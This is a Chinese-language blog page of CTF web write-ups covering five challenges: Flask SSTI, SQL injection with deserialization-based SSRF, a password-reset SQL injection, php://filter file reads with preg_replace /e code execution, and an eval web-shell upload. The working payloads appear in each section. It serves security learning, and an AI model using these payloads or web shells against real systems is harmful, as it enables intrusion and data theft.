@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CTF-web-04 | ZJR&#39;blog</title>
+  <meta name="keywords" content=" ctf-web ">
+  <meta name="description" content="CTF-web-04 | ZJR&#39;blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="题目来源于攻防世界 shrine题目来源：TokyoWesterns CTF 打开页面是一段源码参考CTFTIME上的解析https:&#x2F;&#x2F;ctftime.org&#x2F;writeup&#x2F;10895大佬的博客https:&#x2F;&#x2F;www.dazhuanlan.com&#x2F;2019&#x2F;12&#x2F;19&#x2F;5dfaeb8cf31c7&#x2F; import flask import os  app &#x3D; flask.Flask(__name">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-web-04">
+<meta property="og:url" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/index.html">
+<meta property="og:site_name" content="ZJR&#39;blog">
+<meta property="og:description" content="题目来源于攻防世界 shrine题目来源：TokyoWesterns CTF 打开页面是一段源码参考CTFTIME上的解析https:&#x2F;&#x2F;ctftime.org&#x2F;writeup&#x2F;10895大佬的博客https:&#x2F;&#x2F;www.dazhuanlan.com&#x2F;2019&#x2F;12&#x2F;19&#x2F;5dfaeb8cf31c7&#x2F; import flask import os  app &#x3D; flask.Flask(__name">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/shrine01.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/shrine02.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/shrine03.jpg">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/shrine04.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/fakebook01.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/fakebook02.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/fakebook03.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/isc-0401.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/isc-0402.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/isc-0501.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/isc-0502.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/isc-0503.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/isc-0504.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/isc-0701.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/isc-0702.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/isc-0703.png">
+<meta property="article:published_time" content="2020-03-13T07:33:04.000Z">
+<meta property="article:modified_time" content="2020-04-03T10:48:33.265Z">
+<meta property="article:author" content="ZJR">
+<meta property="article:tag" content="ctf-web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zjr-g.github.io/2020/03/13/CTF-web-04/shrine01.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>ZJR</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+        <a title="github" href="https://github.com/zjr-g" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:zjre@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1402576652&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章</div></li>
+    
+        
+            
+            <li><div data-rel="Tips">Tips</div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="CTF">CTF</div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="MySqlCourse">MySqlCourse</div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="24">
+<input type="hidden" id="yelog_site_word_count" value="36.3k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color1">aes加密</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">base64</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">ctf-web</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">file_incloude</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">MySql_where</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">MySql_like</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_regexp</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_select</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_order by</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Git</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_group by</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_having</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">MySql_show</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_function</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">MySql_jion</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_insert</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_update</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_delete</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_concat</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">MySql_union</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_create</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">MySql_alter</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">SSIT</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_subquery</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Markdown</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">zip</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">hexo</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="Tips "
+           href="/2020/02/18/Aes/"
+           data-tag="aes加密"
+           data-author="" >
+            <span class="post-title" title="Aes加密解析">Aes加密解析</span>
+            <span class="post-date" title="2020-02-18 11:13:30">2020/02/18</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/02/11/Base64/"
+           data-tag="base64"
+           data-author="" >
+            <span class="post-title" title="神奇的Base64隐写">神奇的Base64隐写</span>
+            <span class="post-date" title="2020-02-11 21:01:02">2020/02/11</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/03/13/CTF-web-04/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-04">CTF-web-04</span>
+            <span class="post-date" title="2020-03-13 15:33:04">2020/03/13</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/03/03/CTF-web-03/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-03">CTF-web-03</span>
+            <span class="post-date" title="2020-03-03 22:52:30">2020/03/03</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/03/03/CTF-web-02/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-02">CTF-web-02</span>
+            <span class="post-date" title="2020-03-03 22:48:14">2020/03/03</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/02/28/CTF-web-01/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-01">CTF-web-01</span>
+            <span class="post-date" title="2020-02-28 20:11:44">2020/02/28</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/28/FileIncloude/"
+           data-tag="file_incloude"
+           data-author="" >
+            <span class="post-title" title="FileIncloude(常见的文件包含漏洞及PHP伪协议分析)">FileIncloude(常见的文件包含漏洞及PHP伪协议分析)</span>
+            <span class="post-date" title="2020-02-28 20:56:42">2020/02/28</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/02/MySql-Course03/"
+           data-tag="MySql_where,MySql_like"
+           data-author="" >
+            <span class="post-title" title="MySql(数据过滤)">MySql(数据过滤)</span>
+            <span class="post-date" title="2020-02-02 10:55:26">2020/02/02</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/03/MySql-Course04/"
+           data-tag="MySql_regexp"
+           data-author="" >
+            <span class="post-title" title="MySql(正则表达式)">MySql(正则表达式)</span>
+            <span class="post-date" title="2020-02-03 11:22:09">2020/02/03</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/01/MySql-Course02/"
+           data-tag="MySql_select,MySql_order by"
+           data-author="" >
+            <span class="post-title" title="MySql(select的使用)">MySql(select的使用)</span>
+            <span class="post-date" title="2020-02-01 11:12:32">2020/02/01</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/18/Git/"
+           data-tag="Git"
+           data-author="" >
+            <span class="post-title" title="Git">Git</span>
+            <span class="post-date" title="2020-02-18 19:47:13">2020/02/18</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/05/MySql-Course07/"
+           data-tag="MySql_group by,MySql_having"
+           data-author="" >
+            <span class="post-title" title="MySql(数据分组)">MySql(数据分组)</span>
+            <span class="post-date" title="2020-02-05 09:49:48">2020/02/05</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/01/31/MySql-Course01/"
+           data-tag="MySql_show"
+           data-author="" >
+            <span class="post-title" title="MySql(连接，创建等操作)">MySql(连接，创建等操作)</span>
+            <span class="post-date" title="2020-01-31 21:02:14">2020/01/31</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/04/MySql-Course06/"
+           data-tag="MySql_function"
+           data-author="" >
+            <span class="post-title" title="MySql(函数)">MySql(函数)</span>
+            <span class="post-date" title="2020-02-04 10:33:02">2020/02/04</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/06/MySql-Course09/"
+           data-tag="MySql_jion"
+           data-author="" >
+            <span class="post-title" title="MySql(联结)">MySql(联结)</span>
+            <span class="post-date" title="2020-02-06 16:59:41">2020/02/06</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/07/MySql-Course11/"
+           data-tag="MySql_insert,MySql_update,MySql_delete"
+           data-author="" >
+            <span class="post-title" title="MySql(增删改)">MySql(增删改)</span>
+            <span class="post-date" title="2020-02-07 12:36:57">2020/02/07</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/03/MySql-Course05/"
+           data-tag="MySql_concat"
+           data-author="" >
+            <span class="post-title" title="MySql(字符拼接)">MySql(字符拼接)</span>
+            <span class="post-date" title="2020-02-03 18:24:11">2020/02/03</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/07/MySql-Course10/"
+           data-tag="MySql_union"
+           data-author="" >
+            <span class="post-title" title="MySql(组合查询UNION)">MySql(组合查询UNION)</span>
+            <span class="post-date" title="2020-02-07 11:37:50">2020/02/07</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/08/MySql-Course12/"
+           data-tag="MySql_create,MySql_alter"
+           data-author="" >
+            <span class="post-title" title="MySql(创建和操纵表)">MySql(创建和操纵表)</span>
+            <span class="post-date" title="2020-02-08 10:54:47">2020/02/08</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/28/SSIT-Inject/"
+           data-tag="SSIT"
+           data-author="" >
+            <span class="post-title" title="SSIT-Inject">SSIT-Inject</span>
+            <span class="post-date" title="2020-02-28 20:52:27">2020/02/28</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/05/MySql-Course08/"
+           data-tag="MySql_subquery"
+           data-author="" >
+            <span class="post-title" title="MySql(子查询)">MySql(子查询)</span>
+            <span class="post-date" title="2020-02-05 11:04:05">2020/02/05</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/01/23/StudyM/"
+           data-tag="Markdown"
+           data-author="" >
+            <span class="post-title" title="LearnMarkdown">LearnMarkdown</span>
+            <span class="post-date" title="2020-01-23 00:45:22">2020/01/23</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/11/Zip/"
+           data-tag="zip"
+           data-author="" >
+            <span class="post-title" title="Zip结构及其伪加密">Zip结构及其伪加密</span>
+            <span class="post-date" title="2020-02-11 21:03:24">2020/02/11</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/01/24/hexo-tips-01/"
+           data-tag="hexo"
+           data-author="" >
+            <span class="post-title" title="hexo中插入本地图片">hexo中插入本地图片</span>
+            <span class="post-date" title="2020-01-24 10:13:53">2020/01/24</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-CTF-web-04" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">CTF-web-04</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color3">ctf-web</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-04-03 18:48:33'>2020-03-13 15:33</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:1.8k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shrine"><span class="toc-text">shrine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fakebook"><span class="toc-text">fakebook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ics-04"><span class="toc-text">ics-04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ics-05"><span class="toc-text">ics-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ics-07"><span class="toc-text">ics-07</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>题目来源于攻防世界</p>
+<h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p>题目来源：TokyoWesterns CTF</p>
+<p>打开页面是一段源码<br>参考<br>CTFTIME上的解析<a href="https://ctftime.org/writeup/10895" target="_blank" rel="noopener">https://ctftime.org/writeup/10895</a><br>大佬的博客<a href="https://www.dazhuanlan.com/2019/12/19/5dfaeb8cf31c7/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/12/19/5dfaeb8cf31c7/</a></p>
+<pre><code class="php">import flask
+import os
+
+app = flask.Flask(__name__)
+
+app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)
+
+
+def ():
+    return open(__file__).read()
+
+@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)
+def shrine(shrine):
+
+    def safe_jinja(s):
+        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)
+        blacklist = [&#39;config&#39;, &#39;self&#39;]
+        return &#39;&#39;.join([&#39;{{% set {}=None%}}&#39;.format(c) for c in blacklist]) + s
+
+    return flask.render_template_string(safe_jinja(shrine))
+
+if __name__ == &#39;__main__&#39;:
+    app.run(debug=True)</code></pre>
+<p>这是一个flask在/shrine/下的SSTI。<br>safe_jinja()函数对参数进行了过滤：</p>
+<ul>
+<li>将“(”和“)”替换为空字符</li>
+<li>将config和self加入了黑名单，让它们返回None</li>
+</ul>
+<p>输入参数进行模板探测</p>
+<blockquote>
+<p>{ {7<em>7} }<br><img src="shrine01.png" alt="shrine01"><br>{ {7\</em>‘7’} }<br><img src="shrine02.png" alt="shrine02"></p>
+</blockquote>
+<p>发现是jinja2或Twig，后端源码为flask<br>一般探测步骤<br><img src="shrine03.jpg" alt="shrine03"></p>
+<p>由于对()和config、self进行过滤，所以还剩下get_flashed_messages(), url_for()这两个内置函数，可以构造</p>
+<blockquote>
+<p>{ {get_flashed_messages.<em>\</em>globals__[‘current_app’].config[‘FLAG’]} }<br>或<br>{ {url_for.<em>\</em>globals__[‘current_app’].config[‘FLAG’]} }<br><img src="shrine04.png" alt="shrine04"></p>
+</blockquote>
+<p>关于模板SSTI模板注入，用另一篇文章来详解</p>
+<h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p>题目来源：网鼎杯 2018</p>
+<p>还是挺有意思的一道题<br>进入网页后有登录和注册，那就先注册一个账号，注册时发现blog处要填写url。<br>注册完毕后查看个人信息，发现web应用加载了用户的blog网址<br><img src="fakebook01.png" alt="fakebook01"><br>这里我填了一个不存在的url所有没有加载出来。这里就存在SSRF漏洞（服务器会访问blog里的url）<br>对网站进行目录扫描，发现flag.php文件在根目录下，还发现了robots.txt文件，发现源码，想必flag就在这个文件中了，我们要做的就是想办法读取它。同时发现这个页面还存在sql注入。<br><img src="fakebook02.png" alt="fakebook02"><br>对此页面进行注入，发现这个表有4个字段，第二个字段为用户名，第三个字段为年龄，第四个字段放的就是blog的url，这里对空格进行了过滤所以使用/**/来绕过<br><img src="fakebook03.png" alt="fakebook03"></p>
+<p>发现服务器对数据进行了反序列化的处理，由此可知，在数据库里的数据是序列化后的数据，再结合泄露的源码，我们就可以利用SSRF漏洞让服务器读取本地的flag.php文件。</p>
+<p>泄露的源码<br><a href="fakebook.php.bak">fakebook.php.bak</a></p>
+<p>序列化脚本</p>
+<pre><code class="php">&lt;?php
+class UserInfo
+{
+    public $name = &quot;&quot;;
+    public $age = 0;
+    public $blog = &quot;&quot;;
+
+    public function __construct($name, $age, $blog)
+    {
+        $this-&gt;name = $name;
+        $this-&gt;age = (int)$age;
+        $this-&gt;blog = $blog;
+    }
+
+    function get($url)
+    {
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $output = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) {
+            return 404;
+        }
+        curl_close($ch);
+
+        return $output;
+    }
+
+    public function getBlogContents ()
+    {
+        return $this-&gt;get($this-&gt;blog);
+    }
+
+    public function isValidBlog ()
+    {
+        $blog = $this-&gt;blog;
+        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
+    }
+}
+$a = new UserInfo();
+$a-&gt;name=&#39;34&#39;;
+$a-&gt;age=12;
+$a-&gt;blog=&#39;file:///var/www/html/flag.php&#39;; //本地的flag文件路径
+echo serialize($a);
+?&gt;</code></pre>
+<p>序列化后的数据</p>
+<blockquote>
+<p>O:8:”UserInfo”:3:{s:4:”name”;s:2:”34”;s:3:”age”;i:12;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}</p>
+</blockquote>
+<p>payload:</p>
+<blockquote>
+<p>-1/**/union/**/select/**/1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:4:”test”;s:3:”age”;i:20;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;} ‘</p>
+</blockquote>
+<p>访问后查看源代码，里面有经过base64编码后的flag</p>
+<p>这里还有一个非预期的解法,这里题目没有过滤load_file文件<br>payload</p>
+<blockquote>
+<p>/view.php?no=0+unIon/**/select+1,load_file(‘/var/www/html/flag.php’),1,1</p>
+</blockquote>
+<h2 id="ics-04"><a href="#ics-04" class="headerlink" title="ics-04"></a>ics-04</h2><p>题目来源：XCTF 4th-CyberEarth</p>
+<p>通过点击发现有登录，注册，和找回密码页面。<br>对各个页面进行测试发现，找回密码处存在sql注入，是POST注入，利用bp抓包，然后后跑包，爆出数据库<br><img src="isc-0401.png" alt="isc-0401"><br><img src="isc-0402.png" alt="isc-0402"><br>管理员用户名应该就是c3tlwDIn23，密码是经过MD5加密的，拿去解密即可得到密码，然后去登陆即可得到flag。<br>或者是使用这个用户名去注册，密码自己填，这样就相当于给管理员重置密码了。这很明显是因为注册时服务器没有检查用户是否已经存在。</p>
+<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>题目来源：XXCTF 4th-CyberEarth</p>
+<p>根据题目提示，进入设备维护中心页面，发现页面返回一片空白。地址栏里也没有请求参数。<br>那就先查看网页源码，看看有什么。<br><img src="isc-0501.png" alt="isc-0501"><br>发现了，这个页面是有请求参数的，当然这里没有与数据库的交互场景，所以排除sql注入的可能。<br>经过尝试发现参数内容会在页面显示。<br><img src="isc-0502.png" alt="(isc-0502"><br>想到，这存在php伪协议，这会造成任意文件读取漏洞。</p>
+<blockquote>
+<p>page=php://filter/read=convert.base64-encode/resource=index.php</p>
+</blockquote>
+<p>获得了base64编码后的index页面的源码<br>为什么中间要转base64编码，如果不转码，则相当于进行请求网页（继续打开网页）<br>输入payload得到一段base64</p>
+<p>放入notepad++解码，进行源码分析<br><img src="isc-0503.png" alt="isc-0503"></p>
+<p>伪造XFF头来登入系统，同时利用preg_replace函数的漏洞<br>preg_replace 函数执行一个正则表达式的搜索和替换，preg_replce正则表达式部分包含e参数的时候，进行替换的部分会被执行。<br>当pre_replace的参数pattern输入/e的时候 ,参数replacement的代码当作PHP代码执行<br>于是构造payload</p>
+<blockquote>
+<p>?pat=/123/e&amp;rep=system(‘cat+s3chahahaDir/flag/flag.php’)&amp;sub=123</p>
+</blockquote>
+<p><img src="isc-0504.png" alt="isc-0504"><br>这里文件路径通过ls查看，不断试出来即可。</p>
+<h2 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a>ics-07</h2><p>题目来源：XCTF 4th-CyberEarth</p>
+<p>题目说了是页面解析漏洞，可以看源码，分析源码</p>
+<p>第一段</p>
+<pre><code class="php">&lt;?php
+    if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#39;1&#39; &amp;&amp; substr($_GET[id], -1) === &#39;9&#39;) {
+        include &#39;config.php&#39;;
+        $id = mysql_real_escape_string($_GET[id]);
+        $sql=&quot;select * from cetc007.user where id=&#39;$id&#39;&quot;;
+        $result = mysql_query($sql);
+        $result = mysql_fetch_object($result);
+    } else {
+        $result = False;
+        die();
+    }
+        if(!$result)die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;);
+        if($result){
+        echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;;
+        echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;;
+        $_SESSION[&#39;admin&#39;] = True;
+    }
+?&gt;</code></pre>
+<p>我们只需要绕过isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== ‘1’ &amp;&amp; substr($_GET[id], -1) === ‘9’<br>拿到 $_SESSION[‘admin’] = True;<br>构造payload：?id=1/9&amp;submit&amp;page=flag.php<br><img src="isc-0701.png" alt="1"><br>这里1/9的floatval的值不等于1且是9结尾，所以符号条件，得到了admin的session</p>
+<p>下一段</p>
+<pre><code class="php">&lt;?php
+    if ($_SESSION[&#39;admin&#39;]) {
+    $con = $_POST[&#39;con&#39;];
+    $file = $_POST[&#39;file&#39;];
+    $filename = &quot;backup/&quot;.$file;
+    if(preg_match(&#39;/.+\.ph(p[3457]?|t|tml)$/i&#39;, $filename)){
+        die(&quot;Bad file extension&quot;);
+    }else{
+        chdir(&#39;uploaded&#39;); //这里需要注意路径已经切换到uploaded下面了，所以最后我们写入的文件在“/uploaded/backup/”下了
+        $f = fopen($filename, &#39;w&#39;);
+        fwrite($f, $con);
+        fclose($f);
+       }
+    }
+?&gt;</code></pre>
+<p>这里的正则没看懂，拿去在线匹配也没匹配到什么😂<br>看了大佬的wp<br>说这个是只过滤了最后一个”.”后面的东西。</p>
+<p>可以使用filename/.来过滤</p>
+<p>现在写个一句话进去<br>con是文件内容<br>file是文件名<br>使用POST传参</p>
+<blockquote>
+<p>con=<?php @eval($_POST\['123']);?>&amp;file=../kill.php/.</p>
+</blockquote>
+<p><img src="isc-0702.png" alt="2"><br>注意，我们要在第一个前提下才能进行这一步的文件写入操作<br>菜刀连接即可<br><img src="isc-0703.png" alt="3"><br>其实这就是一个简单的文件包含，就是正则表达式的绕过😂<br>话说题目是解析漏洞，但是我php6不能被解析😂</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 zjre@qq.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>CTF-web-04</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">1.8k</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="ZJR">ZJR</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-03-13, 15:33:04</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-03, 18:48:33</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/03/13/CTF-web-04/" title="CTF-web-04">http://zjr-g.github.io/2020/03/13/CTF-web-04/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2020 Zlog</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
